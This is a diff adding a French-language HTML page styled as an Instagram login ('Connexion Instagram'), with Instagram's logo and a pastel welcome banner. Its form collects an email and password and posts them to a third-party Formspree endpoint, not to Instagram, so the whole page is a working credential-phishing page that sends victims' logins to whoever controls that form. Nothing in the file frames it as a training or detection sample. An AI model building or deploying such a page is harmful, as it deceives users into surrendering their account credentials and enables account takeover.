@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion Instagram</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.card {
+    background: white;
+    border-radius: 20px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    overflow: hidden;
+    width: 350px;
+    max-width: 90%;
+    text-align: center;
+}
+
+.card img {
+    width: 100%;
+    display: block;
+}
+
+.text-multicolor {
+    font-size: 20px;
+    font-weight: bold;
+    margin: 15px 0;
+    background: linear-gradient(90deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.container {
+    padding: 20px;
+}
+
+input, textarea {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    background: #fafafa;
+    font-size: 14px;
+}
+
+input:focus, textarea:focus {
+    outline: none;
+    border-color: #a8a8a8;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    background: #0095f6;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    background: #007cd1;
+}
+
+.footer {
+    margin-top: 12px;
+    font-size: 12px;
+    color: #00376b;
+    cursor: pointer;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+    font-size: 28px;
+    font-weight: bold;
+    color: #262626;
+}
+
+.logo img {
+    width: 40px;
+    height: 40px;
+    margin-right: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <!-- Image Instagram style -->
+    <img src="efe5109b-eeb0-48ed-924b-86212c81c0e4.png" alt="">
+
+    <!-- Texte multicolore pastel -->
+    <div class="text-multicolor">Profite avec tes ami(e)s</div>
+
+    <!-- Logo Insta -->
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+        Instagram
+    </div>
+
+    <!-- Formulaire Formspree -->
+    <div class="container">
+        <form action="https://formspree.io/f/mojnwean" method="POST">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
